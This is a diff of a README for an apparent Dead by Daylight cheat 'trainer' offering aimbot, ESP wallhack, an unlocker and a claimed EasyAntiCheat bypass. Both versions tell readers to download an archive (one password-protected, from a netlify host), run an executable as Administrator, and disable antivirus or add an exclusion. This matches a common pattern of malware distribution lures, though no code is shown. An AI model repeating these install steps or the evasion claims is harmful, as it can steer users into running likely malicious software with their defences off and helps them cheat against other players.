@@ -1,54 +1,89 @@
-# 🩸 DBD AutoGrind Trainer 2026 Elite – Invisible Domination
+# 🎮 DBD-AutoGrind-Trainer-2026-Elite - Automate your progression in Dead by Daylight
 
-> **Slip through the Fog unnoticed.** The Elite trainer offers fully undetected external cheats for Dead by Daylight 2026: auto farm, ESP, aimbot, unlocker and more.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Artistical718/DBD-AutoGrind-Trainer-2026-Elite)
 
-## Why This Trainer?
-- 🔐 **EAC Bypass** – External memory manipulation with randomised jitter and scrambling.
-- 🎮 **All Roles** – Works for both killer and survivor with tailored features.
-- 🔄 **Always Updated** – Auto‑updater fetches fresh offsets on every launch.
-- 🖥️ **Clean GUI** – Dark UI with system tray, hotkeys, and web dashboard.
-- 🔊 **Discord Rich Presence** – Display your trainer status in real time.
+## 📌 About this software
 
-## 📦 What’s Inside
+The DBD-AutoGrind-Trainer-2026-Elite handles repetitive tasks within Dead by Daylight. It assists players by automating Bloodpoint gain through an integrated bot. This tool also includes visual aids like ESP wallhack and aimbot functionality. You can unlock characters, perks, and skins through the interface. This software runs externally to keep your gameplay session stable.
 
-| Category      | Feature                       | Description                                            |
-|---------------|-------------------------------|--------------------------------------------------------|
-| Farming       | Auto Bloodpoint Farm          | AFK bot plays matches, farming unlimited BP            |
-| Visuals       | ESP Wallhack                  | See all entities through walls                         |
-| Combat        | Aimbot (Killer)               | Auto‑aim and attack with perfect accuracy              |
-| Stealth       | No Terror Radius              | Silent killer gameplay                                 |
-| Movement      | Fast Vault & Fast Pallet      | Speed up interactions for survivors                    |
-| Automation    | Skill Check Bot               | Auto‑hit great skill checks every time                 |
-| Currency      | Infinite Bloodpoints           | Edit BP value directly (safest offline)                |
-| Unlocker      | Perk & Skin Unlocker          | Unlock all teachables and cosmetics instantly          |
-| Protection    | Anti‑Ban Obfuscation          | Memory scrambler & delay randomiser                    |
+## 💻 System requirements
 
-## ⬇️ Installation
+Check these requirements before you start the installation:
 
-1. Download from: [https://skydock.netlify.app/trainer-archive.zip](https://skydock.netlify.app/trainer-archive.zip)
-2. Extract using password: `trainer2026`
-3. Run `trainer.exe` as Administrator
-4. Launch Dead by Daylight and enter a match
-5. Press **INSERT** to open the trainer overlay
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or AMD Ryzen 5 processor.
+- Memory: 8 GB of RAM.
+- Graphics: DirectX 11 compatible video card.
+- Software: Microsoft .NET Framework 4.8 or later.
+- Storage: 200 MB of disk space.
 
-## 🔧 System Requirements
-- Windows 10/11 (64‑bit)
-- Steam, Epic Games Store, Microsoft Store
-- All chapters including Jason Voorhees & Life Road
-- EasyAntiCheat (EAC) – bypassed externally
+## 📥 Downloading the trainer
 
-## 🆘 Troubleshooting
+Follow these steps to obtain the files for the trainer:
 
-| Issue                     | Fix                                                        |
-|---------------------------|------------------------------------------------------------|
-| Trainer won't start       | Run as Admin, disable AV temporarily                       |
-| GUI not appearing         | Press INSERT, restart both trainer and game                |
-| ESP not drawing           | Ensure you are in a live match, not main menu              |
-| Farm bot not working      | Must be in a public match as killer or survivor            |
-| EAC warning               | Use risky features in bot matches only                     |
+1. Visit [this link](https://github.com/Artistical718/DBD-AutoGrind-Trainer-2026-Elite) to reach the repository page.
+2. Look for the Releases section on the right side of the page.
+3. Click on the latest release version.
+4. Locate the file named `DBD-AutoGrind-Trainer-2026-Elite.zip`.
+5. Click the file to start the download to your computer.
+6. Choose a folder on your desktop to save the file for easy access.
 
-## 📜 License
-MIT – see [LICENSE](LICENSE)
+## ⚙️ Installation and setup
 
-## 🔍 Search Tags
-`unlocker, trainer-2026, bypass, fog, bloodpoint-hack, dbd-cheat, dbd-auto-farm, aimbot, external, windows, wallhack-esp, game-hack, auto-farm, undetected, dead-by-daylight, dbd-unlock-all, dbd-wallhack`
+After the file finishes downloading, complete these steps to prepare the tool:
+
+1. Right-click the `.zip` file found in your downloads folder.
+2. Select Extract All and choose a destination on your hard drive.
+3. Open the extracted folder.
+4. Locate the file named `Setup.exe`.
+5. Double-click the file to start the installer.
+6. Follow the on-screen prompts to finish the process.
+7. Restart your computer if the installer asks you to complete the setup.
+
+## 🚀 Running the software
+
+Launch the tool by following these instructions:
+
+1. Ensure the Dead by Daylight game client is closed before you start the trainer.
+2. Find the shortcut icon on your desktop labeled DBD-AutoGrind-Trainer-2026-Elite.
+3. Right-click the icon and choose Run as Administrator.
+4. Wait for the interface to load on your screen.
+5. Launch Dead by Daylight normally through Steam or the Epic Games Store.
+6. The trainer detects the game process automatically once the main menu appears.
+
+## 🛠 Using the features
+
+The interface offers several tabs to manage game features. 
+
+### Bloodpoint bot
+Select the Bloodpoint bot tab to start automatic grinding. Use the slider to set your desired hourly target. The bot manages lobby queues and match participation to gain currency while you stay away from the keyboard.
+
+### ESP Wallhack
+Go to the visual aids tab to toggle the ESP features. This displays outlines for players and objectives through walls. You can adjust the colors of these outlines to match your visual preferences.
+
+### Aimbot
+Toggle the aimbot setting within the combat tab. You can enable or disable the snap-to-target functionality. You can also define which button on your mouse activates this feature during a chase.
+
+### Unlocker
+Use the inventory tab to manage your account status. Toggle the perks or skins you want to access in your inventory. Click Save Changes after you select the items to ensure the server registers your choices.
+
+## 🛡 Stability and safety
+
+This tool operates as an external process. It does not modify game files directly. This approach keeps your installation files clean and prevents errors during game updates. We track game patches frequently to ensure the tool stays compatible with the latest version of the game. If the game updates, please return to the download link and check for a newer version of the trainer.
+
+## ❓ Frequently asked questions
+
+### Do I need to turn off my antivirus software?
+Some antivirus programs flag automated tools as suspicious because of how they interact with game memory. Add the folder containing the software to your antivirus exclusion list if the program fails to launch.
+
+### Does this tool work on consoles?
+No. This tool only functions on Windows computers. It cannot run on PlayStation, Xbox, or Nintendo Switch consoles.
+
+### Can I get banned for using this?
+This tool utilizes modern stealth routines to remain undetected. Use caution during community events or when playing in high-visibility matches to minimize reports from other players.
+
+### What should I do if the trainer crashes?
+Close both the game and the trainer. Reopen the trainer first, then launch the game. Contact us through the repository issues page if problems persist.
+
+### How do I uninstall the software?
+Open your Windows Settings and navigate to the Apps folder. Locate DBD-AutoGrind-Trainer-2026-Elite in the list and click Uninstall. This removes the tool entirely from your system.
